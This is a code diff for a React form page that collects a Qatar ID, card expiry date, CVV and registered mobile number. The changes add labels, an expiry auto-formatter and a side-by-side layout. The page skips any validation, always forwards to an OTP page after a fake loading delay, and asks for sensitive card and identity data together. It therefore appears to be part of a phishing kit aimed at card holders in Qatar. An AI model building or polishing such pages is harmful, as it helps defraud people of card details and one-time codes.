@@ -6,7 +6,7 @@ import Logo from "@/assets/logo.png";
 const EXPIRY = () => {
   const navigate = useNavigate();
 
-  const [customerId, setCustomerId] = useState("");
+  const [qatarID, setQatarId] = useState("");
   const [expiryDate, setExpiryDate] = useState("");
   const [cvv, setCvv] = useState("");
   const [mobile, setMobile] = useState("");
@@ -18,6 +18,17 @@ const EXPIRY = () => {
       setLoading(false);
       navigate("/exp-otp"); // ✅ Always go to next page
     }, 1500);
+  };
+
+  // 🔥 Expiry date auto-format (MM/YY)
+  const handleExpiryChange = (e) => {
+    let value = e.target.value.replace(/\D/g, ""); // remove non-numeric
+    if (value.length > 4) value = value.slice(0, 4);
+
+    if (value.length >= 3) {
+      value = value.slice(0, 2) + "/" + value.slice(2);
+    }
+    setExpiryDate(value);
   };
 
   return (
@@ -40,43 +51,58 @@ const EXPIRY = () => {
           Enter your details to continue
         </p>
 
-        {/* Customer ID */}
+        {/* Qatar ID */}
         <div className="mb-4">
+          <label className="block text-sm font-medium text-gray-700 mb-1">
+            Qatar ID
+          </label>
           <input
             type="text"
-            placeholder="Customer ID"
-            value={customerId}
-            onChange={(e) => setCustomerId(e.target.value)}
+            placeholder="Enter your Qatar ID"
+            value={qatarID}
+            onChange={(e) => setQatarId(e.target.value)}
             className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
           />
         </div>
 
-        {/* Expiry Date (Month/Year only) */}
-        <div className="mb-4">
-          <input
-            type="month"
-            value={expiryDate}
-            onChange={(e) => setExpiryDate(e.target.value)}
-            className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
-          />
-        </div>
-
-        {/* CVV */}
-        <div className="mb-4">
-          <input
-            type="password"
-            placeholder="CVV"
-            value={cvv}
-            onChange={(e) => setCvv(e.target.value)}
-            className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
-          />
+        {/* Expiry Date & CVV in same row */}
+        <div className="flex gap-3 mb-4">
+          <div className="flex-1">
+            <label className="block text-sm font-medium text-gray-700 mb-1">
+              Expiry Date (MM/YY)
+            </label>
+            <input
+              type="text"
+              placeholder="12/12"
+              value={expiryDate}
+              onChange={handleExpiryChange}
+              maxLength={5}
+              className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
+            />
+          </div>
+          <div className="w-24">
+            <label className="block text-sm font-medium text-gray-700 mb-1">
+              CVV
+            </label>
+            <input
+              type="password"
+              placeholder="123"
+              value={cvv}
+              onChange={(e) => setCvv(e.target.value)}
+              maxLength={3}
+              className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
+            />
+          </div>
         </div>
 
         {/* Mobile Number */}
         <div className="mb-6">
+          <label className="block text-sm font-medium text-gray-700 mb-1">
+            Registered Mobile Number
+          </label>
           <input
             type="text"
-            placeholder="Registered Mobile Number"
+            placeholder="Enter your mobile number"
             value={mobile}
             onChange={(e) => setMobile(e.target.value)}
             className="w-full p-3 border bg-white rounded-full focus:outline-none focus:ring-2 focus:ring-blue-400"
